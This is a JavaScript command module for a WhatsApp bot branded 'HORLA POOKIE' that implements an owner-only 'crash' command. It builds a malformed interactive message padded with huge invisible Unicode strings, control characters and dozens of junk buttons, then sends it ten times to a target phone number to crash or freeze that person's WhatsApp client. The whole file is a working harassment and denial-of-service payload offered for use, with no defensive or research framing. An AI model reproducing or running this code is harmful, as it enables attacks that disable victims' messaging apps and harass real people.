import config from '../../config.js';

// Owner number for access control
const OWNER_NUMBER = config.ownerNumber.replace(/^\+/, '');
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

// Normalize phone number
const normalizeNumber = (number) => {
  return number.replace(/[^0-9]/g, '').replace(/^0+/, '').replace(/^\+234/, '234') || number;
};

// Validate phone number
const isValidPhoneNumber = (number) => {
  const cleaned = number.replace(/[^0-9]/g, '');
  return /^234[0-9]{10}$/.test(cleaned); // Must start with 234 and have 10 digits
};

// Sleep function for delay
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Malicious message function
async function sendCrashMessage(sock, target) {
  console.log(`[DEBUG] Sending crash message to ${target}`);

  const venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 999999,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["2.25.12.25", "Beta"],
          browser: ["Chrome", "Windows"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          depayyCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          emitOwnEvents: true,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          auth: { Object: "authData" },
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  const longChar = "\u200E".repeat(1024) + "ꦽ".repeat(80000); // Invisible oversized string

  const message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: { platform: "android", version: "2.25.12.25" },
          deviceListMetadataVersion: 3.3,
          isStatusBroadcast: true,
          statusBroadcastJid: "status@broadcast",
          badgeChat: { unreadCount: 9999 },
          isForwarded: true,
          forwardingScore: 7777777
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "proto@newsletter",
          serverMessageId: 1,
          newsletterName: `ALTER WHATSAPP HORLAPOOKIE☠️ ${"ꥈ".repeat(15)}`,
          contentType: 3,
          accessibilityText: `HORLAPOOKIE SORRY 😐 💢 ${"﹏".repeat(2048)}`
        },
        interactiveMessage: {
          contextInfo: {
            businessMessageForwardInfo: { businessOwnerJid: target },
            dataSharingContext: { showMmDisclosure: true },
            participant: "0@s.whatsapp.net",
            mentionedJid: [target]
          },
          body: {
            text: longChar
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 30 }, (_, i) => ({
              name: ["single_select", "payment_method", "form_message", "open_webview"][i % 4],
              buttonParamsJson: venomModsData + "\u0003".repeat(2048),
              ...(i === 10 && { voice_call: "call_galaxy" })
            }))
          }
        }
      }
    },
    additionalNodes: [
      { attrs: { beta_tag: "true" }, tag: "biz" },
      { attrs: { platform: "android", version: "2.25.12.25" }, tag: "client" }
    ],
    stanzaId: `stanza_${Date.now()}`
  };

  try {
    await sock.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[DEBUG] SUCCESS SEND [WhatsApp Beta 2.25.12.25] to ${target}`);
  } catch (e) {
    console.log(`[DEBUG] Error sending crash message to ${target}: ${e.message}`);
    throw e;
  }
}

export default {
  name: 'crash',
  description: '☠️ Send crash message to target (Owner only)',
  category: 'Owner',
  async execute(msg, { sock, args }) {
    const from = msg.key.remoteJid;
    const senderJid = msg.key.participant || msg.key.remoteJid;
    const senderNumber = senderJid.split('@')[0];

    console.log(`[DEBUG] crash triggered by ${senderJid} in ${from}`);

    // Handle null pushName
    const userName = msg.pushName || "Supreme Ruler";

    // Check if user is owner
    const normalizedSender = normalizeNumber(senderNumber);
    const normalizedOwner = normalizeNumber(OWNER_NUMBER);
    const isOwner = senderJid === OWNER_JID || normalizedSender === normalizedOwner;

    console.log(`[DEBUG] Owner check: isOwner=${isOwner}, normalizedSender=${normalizedSender}, normalizedOwner=${normalizedOwner}`);

    if (!isOwner) {
      console.log(`[DEBUG] crash: User is not the owner`);
      await sock.sendMessage(from, {
        text: `HORLA POOKIE\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU VILE IMPOSTOR! 😤 Trying to wield ${OWNER_NUMBER}'s destructive power? You're LESS THAN DUST! Begone! 🚫\n◈━━━━━━━━━━━━━━━━◈`
      }, { quoted: msg });
      return;
    }

    // Validate input
    if (!args[0]) {
      console.log(`[DEBUG] crash: No target provided`);
      await sock.sendMessage(from, {
        text: `HORLA POOKIE\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU FOOL, ${userName}! 😡 Provide a target number! Format: ${config.prefix}crash 234xxx\n◈━━━━━━━━━━━━━━━━◈`
      }, { quoted: msg });
      return;
    }

    // Extract and validate target
    let client = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
                 (msg.message?.extendedTextMessage?.contextInfo?.participant) || 
                 args[0];

    let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : client.replace(/[^0-9]/g, '');

    if (!isValidPhoneNumber(clientNumber)) {
      console.log(`[DEBUG] crash: Invalid target number: ${clientNumber}`);
      await sock.sendMessage(from, {
        text: `HORLA POOKIE\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ IDIOT, ${userName}! 😤 Invalid target number! Use: ${config.prefix}crash 234xxx or tag/quote a user! 🚫\n◈━━━━━━━━━━━━━━━━◈`
      }, { quoted: msg });
      return;
    }

    const targetJid = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;
    console.log(`[DEBUG] crash: Target set to ${targetJid}`);

    // Send processing reaction
    try {
      await sock.sendMessage(from, { react: { text: '🔍', key: msg.key } });
      console.log(`[DEBUG] crash: Processing reaction sent`);
    } catch (e) {
      console.log(`[DEBUG] crash: Error sending processing reaction: ${e.message}`);
    }

    // Send crash messages
    try {
      for (let r = 0; r < 5; r++) {
        try {
          await sendCrashMessage(sock, targetJid);
          await sleep(5000); // 5-second delay
          await sendCrashMessage(sock, targetJid);
          console.log(`[DEBUG] crash: Iteration ${r + 1}/5 completed`);
        } catch (e) {
          console.log(`[DEBUG] crash: Error in iteration ${r + 1}: ${e.message}`);
          throw new Error(`Failed at iteration ${r + 1}: ${e.message}`);
        }
      }

      // Send success reaction
      try {
        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
        console.log(`[DEBUG] crash: Success reaction sent`);
      } catch (e) {
        console.log(`[DEBUG] crash: Error sending success reaction: ${e.message}`);
      }

      // Send confirmation message
      const successMessage = `HORLA POOKIE XMD\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ *Information Attack*\n│❒ Target: ${clientNumber}\n│❒ Status: Success\n│❒ Powered by HORLA POOKIE\n◈━━━━━━━━━━━━━━━━◈`;
      await sock.sendMessage(from, {
        text: successMessage
      }, { quoted: msg });
      console.log(`[DEBUG] crash: Confirmation message sent`);
    } catch (e) {
      console.log(`[DEBUG] crash: Error during attack: ${e.message}`);
      await sock.sendMessage(from, {
        text: `HORLA POOKIE XMD\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ OUTRAGEOUS, ${userName}! 😤 Attack on ${clientNumber} failed: ${e.message}! This system will PAY for its incompetence! 🚫\n◈━━━━━━━━━━━━━━━━◈`
      }, { quoted: msg });
    }
  }
};